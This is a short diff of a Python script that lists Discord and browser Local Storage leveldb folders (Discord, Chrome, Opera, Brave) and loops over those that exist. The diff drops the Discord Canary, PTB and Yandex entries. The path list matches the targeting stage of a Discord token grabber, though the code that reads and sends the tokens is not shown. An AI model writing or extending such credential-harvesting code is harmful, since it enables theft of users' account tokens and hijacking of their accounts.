@@ -12,12 +12,9 @@ roaming = os.getenv('APPDATA')
 
 paths = {
     'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
-    'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb',
-    'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb',
     'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
     'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
     'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
-    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb'
 }
 for platform, path in paths.items():
     if not os.path.exists(path):
